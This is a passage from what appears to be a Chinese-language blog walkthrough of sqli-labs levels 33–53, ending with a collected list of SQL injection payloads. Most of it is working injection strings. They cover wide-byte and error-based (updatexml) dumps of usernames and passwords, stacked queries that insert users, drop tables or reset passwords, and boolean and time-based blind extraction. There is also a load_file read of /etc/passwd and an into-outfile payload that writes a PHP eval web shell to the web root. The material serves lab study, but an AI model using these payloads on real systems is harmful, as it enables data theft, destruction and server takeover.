information_schema.tables where table_schema=database()--+     爆表</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?id=-1%df&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273--+   爆字段</span></span><span class="line"><span style="color: #abb2bf">使用16进制</span></span><span class="line"><span style="color: #abb2bf">?id=-1%df&quot; union select 1,group_concat(password,username),3 from users--+</span></span></code></pre></div></div></figure></li></ul><h2 id="34（post-宽字节）"><a href="#34（post-宽字节）" class="headerlink" title="34（post+宽字节）"></a>34（post+宽字节）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201244881.png" alt="image-20250306213953154"></p><p>表单类型的宽字节</p><p>报错注入</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">1%df&#39;</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1%df&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1%df&#39; and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) --+ </span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1%df&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1) --+</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1%df&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) from users ),0x7e),1%df&#39;</span></span></code></pre></div></div></figure></li></ul><h2 id="35"><a href="#35" class="headerlink" title="35"></a>35</h2><ul><li><p>数字型+函数addslashes()</p><p>（<code>addslashes()</code> 是 PHP 中的一个函数，作用是 <strong>在字符串中特殊字符前添加反斜杠（\）进行转义</strong>，以防止 SQL 注入或字符串解析错误。）</p><p><strong>由于是数字型所以无需要宽字节注入</strong></p><p>直接报错注入</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1 </span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1  and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1  and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) --+ </span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1 and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1) --+</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1 and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) from users ),0x7e),1%df&#39;</span></span></code></pre></div></div></figure></li></ul><h2 id="36"><a href="#36" class="headerlink" title="36"></a>36</h2><ul><li><p>单引号+宽字节+mysql_real_escape_string()函数转义</p></li><li><p><code>mysql_real_escape_string()</code> 是 <strong>PHP</strong> 中的一个函数，主要用于<strong>对字符串中的特殊字符进行转义</strong>，以防止 <strong>SQL 注入</strong></p></li><li><p>使用报错注入即可</p></li><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">1%df&#39;</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1%df&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1%df&#39; and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) --+ </span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1%df&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1) --+</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1%df&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) from users ),0x7e),1%df&#39;</span></span></code></pre></div></div></figure></li></ul><h2 id="37"><a href="#37" class="headerlink" title="37"></a>37</h2><ul><li><p>单引号+post+宽字节+MySQL_real_escape_string</p></li><li><p>同34</p></li><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">1%df&#39;</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1%df&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1%df&#39; and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) --+ </span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1%df&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1) --+</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1%df&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) from users ),0x7e),1%df&#39;</span></span></code></pre></div></div></figure></li></ul><h2 id="38（堆叠注入）"><a href="#38（堆叠注入）" class="headerlink" title="38（堆叠注入）"></a>38（堆叠注入）</h2><p>堆叠&#x2F;报错&#x2F;联合</p><ul><li><p>单引号+<strong>mysqli_multi_query函数</strong></p><p><code>mysqli_multi_query函数</code>支持多条sql语句输出</p></li><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1&#39;;insert into users(id,username,password) values(&#39;18&#39;,&#39;bx&#39;,&#39;2328&#39;);--+</span></span><span class="line"><span style="color: #abb2bf">#id=18的数据修改</span></span><span class="line"><span style="color: #abb2bf">改为账户：bx     密码为2328</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">？id=18</span></span><span class="line"><span style="color: #abb2bf">可查看到18的账户密码已被我们所修改</span></span></code></pre></div></div></figure><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1&#39;;insert into users(id,username,password) values(&#39;18&#39;,&#39;bx&#39;,&#39;2328&#39;);--+</span></span><span class="line"><span style="color: #abb2bf">注册用户</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;;create table xxx like users;--+</span></span><span class="line"><span style="color: #abb2bf">创建xxx表</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;;INSERT INTO xxx SELECT * FROM users;--+</span></span><span class="line"><span style="color: #abb2bf">插入xxx数据</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;;DELETE FROM xxx;--+</span></span><span class="line"><span style="color: #abb2bf">删除xxx数据</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;;DROP TABLE xxx;--+</span></span><span class="line"><span style="color: #abb2bf">删除xxx表</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;;updata users set password=&#39;12345&#39;where username=&#39;xxx&#39;</span></span><span class="line"><span style="color: #abb2bf">修改xxx账户的密码</span></span></code></pre></div></div></figure></li></ul><h2 id="39"><a href="#39" class="headerlink" title="39"></a>39</h2><p>堆叠&#x2F;报错&#x2F;联合</p><ul><li><p>数字型+<strong>mysqli_multi_query函数</strong></p><p>同上</p></li><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1;insert into users(id,username,password) values(&#39;18&#39;,&#39;bx&#39;,&#39;2328&#39;);--+</span></span><span class="line"><span style="color: #abb2bf">#id=18的数据修改</span></span><span class="line"><span style="color: #abb2bf">改为账户：bx     密码为2328</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">？id=18</span></span><span class="line"><span style="color: #abb2bf">可查看到18的账户密码已被我们所修改</span></span></code></pre></div></div></figure></li></ul><h2 id="40"><a href="#40" class="headerlink" title="40"></a>40</h2><p>堆叠&#x2F;联合</p><ul><li><p>无报错+单引号+括号</p></li><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1&#39;);insert into users(id,username,password) values(&#39;18&#39;,&#39;bx&#39;,&#39;2328&#39;);--+</span></span><span class="line"><span style="color: #abb2bf">#id=18的数据修改</span></span><span class="line"><span style="color: #abb2bf">改为账户：bx     密码为2328</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">？id=18</span></span><span class="line"><span style="color: #abb2bf">可查看到18的账户密码已被我们所修改</span></span></code></pre></div></div></figure></li></ul><h2 id="41"><a href="#41" class="headerlink" title="41"></a>41</h2><p>堆叠&#x2F;联合</p><ul><li><p>无报错+数字</p></li><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1&#39;);insert into users(id,username,password) values(&#39;18&#39;,&#39;bx&#39;,&#39;2328&#39;);--+</span></span><span class="line"><span style="color: #abb2bf">#id=18的数据修改</span></span><span class="line"><span style="color: #abb2bf">改为账户：bx     密码为2328</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">？id=18</span></span><span class="line"><span style="color: #abb2bf">可查看到18的账户密码已被我们所修改</span></span></code></pre></div></div></figure></li></ul><h2 id="42-先堆叠，再二次注入"><a href="#42-先堆叠，再二次注入" class="headerlink" title="42(先堆叠，再二次注入)"></a>42(先堆叠，再二次注入)</h2><ul><li><p>账户进行转义，密码没有，但是存在堆叠注入的函数</p><p>（不是gbk编码所以<strong>不能使用</strong>宽字节）</p><p>使用堆叠注入</p><p>单引号</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">login_user=1&amp;login_password=1&#39;;insert into users(id,username,password) values (&#39;39&#39;,&#39;less30&#39;,&#39;123456&#39;)--+&amp;mysubmit=Login</span></span><span class="line"><span style="color: #abb2bf">将id=39</span></span><span class="line"><span style="color: #abb2bf">账号：less30</span></span><span class="line"><span style="color: #abb2bf">密码：123456</span></span></code></pre></div></div></figure></li></ul><h2 id="43"><a href="#43" class="headerlink" title="43"></a>43</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201252794.png" alt="image-20250307152806286"></p><p>为单引号+括号</p></li><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">login_user=1&amp;login_password=1&#39;);insert into users(id,username,password) values (&#39;39&#39;,&#39;less30&#39;,&#39;123456&#39;)--+&amp;mysubmit=Login</span></span><span class="line"><span style="color: #abb2bf">将id=39</span></span><span class="line"><span style="color: #abb2bf">账号：less30</span></span><span class="line"><span style="color: #abb2bf">密码：123456</span></span></code></pre></div></div></figure></li></ul><h2 id="44"><a href="#44" class="headerlink" title="44"></a>44</h2><ul><li><p>无报错</p></li><li><p>测试</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">单引号测试成功</span></span><span class="line"><span style="color: #abb2bf">login_user=1&amp;login_password=1&#39;;insert into users(id,username,password) values (&#39;39&#39;,&#39;less30&#39;,&#39;123456&#39;)--</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">将id=39</span></span><span class="line"><span style="color: #abb2bf">账号：less30</span></span><span class="line"><span style="color: #abb2bf">密码：123456</span></span></code></pre></div></div></figure></li></ul><h2 id="45"><a href="#45" class="headerlink" title="45"></a>45</h2><ul><li><p>无报错</p></li><li><p>测试</p><p>单引号测试不成功</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">单引号+括号 测试成功</span></span><span class="line"><span style="color: #abb2bf">login_user=1&amp;login_password=1&#39;);insert into users(id,username,password) values (&#39;39&#39;,&#39;less30&#39;,&#39;123456&#39;)--</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">将id=39</span></span><span class="line"><span style="color: #abb2bf">账号：less30</span></span><span class="line"><span style="color: #abb2bf">密码：123456</span></span></code></pre></div></div></figure></li></ul><h2 id="46"><a href="#46" class="headerlink" title="46"></a>46</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201255223.png" alt="image-20250307153359198"></p><p>根据提示输入<strong>？sort&#x3D;1</strong></p></li><li><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201257029.png" alt="image-20250307153423526" style="zoom: 25%;" /></li><li><p>出现表格</p></li><li><p>寻找闭合</p><p><strong>数字型</strong></p></li><li><p>报错注入</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?sort=1 and (updatexml(1,concat(0x7c,(select group_concat(password,id,username) from users),0x7c),1))</span></span></code></pre></div></div></figure></li></ul><h2 id="47"><a href="#47" class="headerlink" title="47"></a>47</h2><ul><li><p>同上</p><p>闭合为单引号</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?sort=1&#39; and (updatexml(1,concat(0x7c,(select group_concat(password,id,username) from users),0x7c),1))</span></span></code></pre></div></div></figure></li></ul><h2 id="48（order-by-下的布尔-时间）"><a href="#48（order-by-下的布尔-时间）" class="headerlink" title="48（order by 下的布尔&#x2F;时间）"></a>48（order by 下的布尔&#x2F;时间）</h2><ul><li><p>无报错</p></li><li><p>布尔&#x2F;时间</p><p>布尔</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?sort=rand((ascii(mid((select database()),1,1)))&gt;65)</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">sord=rand and length(database())&gt;7#（猜数据库长度）</span></span><span class="line"><span style="color: #abb2bf">sord=rand and ascii(substr(database(),1,1))&gt;114#（猜数据库名字）</span></span><span class="line"><span style="color: #abb2bf">sord=rand and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5#（猜表名长度）</span></span><span class="line"><span style="color: #abb2bf">sord=rand and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))&gt;116#（猜表名名字）</span></span><span class="line"><span style="color: #abb2bf">sord=rand and (length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;limit 0,1)))&gt;1#（猜列名长度）</span></span><span class="line"><span style="color: #abb2bf">sord=rand and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 1,1),1,1))&gt;116#（猜列名名字）</span></span><span class="line"><span style="color: #abb2bf">sord=rand and length((select password from users limit 0,1))&gt;3#（猜数据长度）</span></span><span class="line"><span style="color: #abb2bf">sord=rand and ascii(substr((select password from users limit 0,1),1,1))&gt;67#（猜数据名字）</span></span></code></pre></div></div></figure><p>时间：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?sort=1&#39;and if(length((select database()))&gt;9,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断数据库名长度</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?sort=1&#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一判断数据库字符</span></span><span class="line"><span style="color: #abb2bf">?sort=1&#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断所有表名长度</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?sort=1&#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一判断表名</span></span><span class="line"><span style="color: #abb2bf">?sort=1&#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;20,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断所有字段名的长度</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?sort=1&#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;99,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一判断字段名。</span></span><span class="line"><span style="color: #abb2bf">?sort=1&#39; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断字段内容长度</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?sort=1&#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一检测内容。</span></span></code></pre></div></div></figure></li></ul><h2 id="49"><a href="#49" class="headerlink" title="49"></a>49</h2><ul><li><p>单引号闭合，无报错，同理，，时间盲注,布尔盲注</p><p><strong>布尔盲注在order by</strong></p><p><strong>?sort&#x3D;’| rand(1&#x3D;2)–+</strong></p><p>使用时间盲注</p></li><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?sort=1&#39;and if(length((select database()))&gt;9,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断数据库名长度</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?sort=1&#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一判断数据库字符</span></span><span class="line"><span style="color: #abb2bf">?sort=1&#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断所有表名长度</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?sort=1&#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一判断表名</span></span><span class="line"><span style="color: #abb2bf">?sort=1&#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;20,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断所有字段名的长度</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?sort=1&#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;99,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一判断字段名。</span></span><span class="line"><span style="color: #abb2bf">?sort=1&#39; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">判断字段内容长度</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?sort=1&#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span></span><span class="line"><span style="color: #abb2bf">逐一检测内容。</span></span></code></pre></div></div></figure></li></ul><h2 id="50-堆叠排序注入"><a href="#50-堆叠排序注入" class="headerlink" title="50(堆叠排序注入)"></a>50(堆叠排序注入)</h2><p>堆叠&#x2F;报错&#x2F;盲注</p><ul><li><p>有报错+数字类型</p></li><li><p>存在 if (mysqli_multi_query($con1, $sql))—&gt;堆叠注入</p></li><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?sort=1;insert into users(id,username,password) values(&#39;41&#39;,&#39;bx&#39;,&#39;2328&#39;);--+</span></span><span class="line"><span style="color: #abb2bf">知道了账户和密码</span></span></code></pre></div></div></figure></li></ul><h2 id="51"><a href="#51" class="headerlink" title="51"></a>51</h2><p>堆叠&#x2F;报错&#x2F;盲注</p><ul><li><p>有报错+单引号类型</p></li><li><p>存在 if (mysqli_multi_query($con1, $sql))—&gt;堆叠注入</p></li><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?sort=1&#39;;insert into users(id,username,password) values(&#39;41&#39;,&#39;bx&#39;,&#39;2328&#39;);--+</span></span><span class="line"><span style="color: #abb2bf">知道了账户和密码</span></span></code></pre></div></div></figure></li></ul><h2 id="52"><a href="#52" class="headerlink" title="52"></a>52</h2><p>堆叠&#x2F;盲注</p><p>无报错+数字型</p><ul><li><p>存在 if (mysqli_multi_query($con1, $sql))—&gt;堆叠注入</p></li><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?sort=1;insert into users(id,username,password) values(&#39;41&#39;,&#39;bx&#39;,&#39;2328&#39;);--+</span></span><span class="line"><span style="color: #abb2bf">知道了账户和密码</span></span></code></pre></div></div></figure></li></ul><h2 id="53"><a href="#53" class="headerlink" title="53"></a>53</h2><p>堆叠&#x2F;盲注</p><p>无报错+单引号</p><ul><li><p>存在 if (mysqli_multi_query($con1, $sql))—&gt;堆叠注入</p></li><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?sort=1&#39;;insert into users(id,username,password) values(&#39;41&#39;,&#39;bx&#39;,&#39;2328&#39;);--+</span></span><span class="line"><span style="color: #abb2bf">知道了账户和密码</span></span></code></pre></div></div></figure></li></ul><h1 id="总结（精华）"><a href="#总结（精华）" class="headerlink" title="总结（精华）"></a>总结（精华）</h1><p>sql注入的诸多payoad利用 </p><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="一、union联合查询注入"><a href="#一、union联合查询注入" class="headerlink" title="一、union联合查询注入"></a>一、union联合查询注入</h2><p>常用函数</p><p>information_schema.tables#information_schema下面的所有表名<br>information_schema.columns#information_schema下面所有的列名<br>table_name#表名<br>column_name#列名<br>table_schema#数据库名<br>information_schema进行跨库攻击</p><h3 id="查看当前数据库"><a href="#查看当前数据库" class="headerlink" title="查看当前数据库"></a>查看当前数据库</h3><p>?id&#x3D;-1 union select 1,database() –+</p><p>1、获取到所有的数据库名称</p><p>?id&#x3D;-2 union select 1,group_concat(schema_name),3 from information_schema.schemata–+<br>2、指定获取book库中的表名信息</p><p>?id&#x3D;-2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’book’–+<br>3、获取指定数据库security下的users表的列名信息</p><p>?id&#x3D;-2’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’security’–+<br>4、查询到指定数据</p><p>?id&#x3D;-2 union select book_id,book_title,book_author from book.book limit 0,1——z–+<br>?id&#x3D;-1’ union select 1,2,group_concat(username ,id , password) from users  ——全部</p><h3 id="文件读写函数注入"><a href="#文件读写函数注入" class="headerlink" title="文件读写函数注入"></a>文件读写函数注入</h3><p>load_file 文件读取</p><p> into outfile 或into dumpfile 文件写入</p><p>?id&#x3D;-2 union select 1,load_file(‘&#x2F;etc&#x2F;passwd’),3<br>?id&#x3D;-2’ union select 1,load_file(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php’),3–+<br>?id&#x3D;-2’union select 1,’<?php @eval($_POST["chuan"]);?>‘,3 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;chuan.php’ –+</p><h2 id="二、报错盲注"><a href="#二、报错盲注" class="headerlink" title="二、报错盲注"></a>二、报错盲注</h2><h3 id="报错注入所利用函数"><a href="#报错注入所利用函数" class="headerlink" title="报错注入所利用函数"></a>报错注入所利用函数</h3><p>updatexml  extractvalue  floor</p><h4 id="‌updatexml‌函数的基本语法："><a href="#‌updatexml‌函数的基本语法：" class="headerlink" title="‌updatexml‌函数的基本语法："></a>‌updatexml‌函数的基本语法：</h4><p>updatexml(xml_document, XPath_string, 